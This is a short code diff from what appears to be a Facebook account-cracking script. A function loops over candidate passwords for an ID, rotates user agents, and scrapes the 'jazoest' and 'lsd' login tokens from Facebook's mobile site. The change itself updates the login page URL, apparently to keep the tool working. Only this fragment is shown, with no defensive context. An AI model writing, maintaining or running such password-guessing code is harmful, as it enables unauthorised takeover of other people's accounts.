@@ -1307,7 +1307,7 @@ def m6(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://lm.facebook.com').text
+   free_fb = session.get(f'https://m.facebook.com').text
    log_data = {
         "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
         "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
